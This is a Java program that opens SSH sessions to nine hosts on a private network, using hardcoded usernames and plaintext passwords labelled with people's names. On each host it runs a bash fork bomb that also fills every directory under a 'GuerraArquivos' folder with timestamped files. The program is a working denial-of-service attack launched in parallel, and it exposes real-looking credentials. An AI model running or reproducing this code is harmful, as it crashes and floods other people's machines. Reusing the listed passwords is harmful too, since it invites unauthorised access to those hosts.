import java.util.ArrayList;
import java.util.List;

import ssh.SSH;

public class Main {
    public static void main(String[] args) {
        List<String[]> connectionData = new ArrayList<>();
        connectionData.add(new String[] { "thales-almaviva", "192.168.208.42", "thales@2203", "/home/thales-almaviva/GuerraArquivos", "22" });//Thales
        connectionData.add(new String[] { "almaviva-linux", "192.168.208.73", "magna@123", "/home/almaviva-linux/GuerraArquivos", "22" });//Gustavo
        connectionData.add(new String[] { "almaviva-linux", "192.168.208.79", "renato@1234", "/home/almaviva-linux/GuerraArquivos", "22" });//Renato
        connectionData.add(new String[] { "almaviva-linux", "192.168.208.90", "C4liforni4!", "/home/almaviva-linux/GuerraArquivos", "22" });//Roberto
        connectionData.add(new String[] { "almaviva", "192.168.208.53", "magna@123", "/home/almaviva/GuerraArquivos", "22" });//Guilherme
        connectionData.add(new String[] { "almaviva-linux", "192.168.208.46", "Almaviva04092004", "/home/almaviva-linux/GuerraArquivos", "22" });//Léo
        connectionData.add(new String[] { "matheus", "192.168.208.49", "magna@123", "/home/matheus/GuerraArquivos", "22" });//Matheus
        connectionData.add(new String[] { "almaviva-linux", "192.168.208.101", "Magna@123", "/home/almaviva-linux/GuerraArquivos", "22" });//Eric
        connectionData.add(new String[] { "vitor", "192.168.208.95", "vito@123!", "/home/vitor/GuerraArquivos", "22" });//Vitor
        


        for (String[] data : connectionData) {
            new Thread(() -> {
                String user = data[0];
                String host = data[1];
                String password = data[2];
                String remotePath = data[3];
                int port = Integer.parseInt(data[4]);

                SSH connection = new SSH();
                connection.connect(user, host, password, port);
                connection.command(
                        String.format(
                                "bash -c ':() { " +
                                        "for D in $(find \"%s\" -type d); do " +
                                        "touch \"$D/eric_$(date +%%s%%N).txt\"; " +
                                        "done; " +
                                        ":|: & " +
                                        "};:'",
                                remotePath),
                        password);
            }).start();
        }
    }
}
